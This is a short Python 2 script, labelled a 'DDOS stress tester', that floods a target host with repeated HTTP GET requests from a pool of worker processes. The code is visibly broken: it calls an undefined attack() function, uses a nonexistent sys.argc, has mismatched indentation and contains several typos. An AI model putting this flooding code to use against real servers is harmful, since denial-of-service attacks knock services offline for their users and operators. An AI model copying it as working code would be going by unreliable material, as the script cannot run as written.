#!usr/bin/env python
##
## DDOS stress tester
## Useage script.py <host> <url> <number of threads>
##
import socket, sys, os
from multiprocessing import Pool

print "Teting " + sys.argv[1] + " ..."
print "injecting " + sys.argv[2]

def sendRequest():
	#pid = os.fork()
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 80))
	print ">> GET /" + sys.argv[2] + " HTTP/1.1"
	s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")
	s.send("Host: " + sys.argv[1] + "\r\n\r\n");
	s.close()
def test():
	for i in range(1, 100):
		attack() 

if __name__ == '__main__':
	if sys.argc != 4:
		print "Their must be 4 arguments : <host> <url> <number of threads>"
		sys.exit(1)
	pool = Pool(processes=sys.argv[3])             # start 4 worker processes
    result = pool.apply_async(test, [])
    print result.get(timeout=1)